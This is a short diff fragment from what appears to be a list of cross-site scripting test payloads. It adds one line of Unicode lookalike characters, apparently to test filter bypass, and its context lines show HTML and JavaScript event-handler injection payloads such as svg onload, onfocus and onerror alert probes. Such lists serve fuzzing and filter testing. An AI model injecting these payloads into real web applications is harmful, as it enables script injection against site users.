@@ -1182,3 +1182,4 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmo
 <div onfocus=alert('xx') id=xss style=display:table>
 <applet onerror=alert('xss')> 
 <object onbeforescriptexecute="alert(1)"/><script>+</script>
+＜℅ncut=ﬁnd()＞x
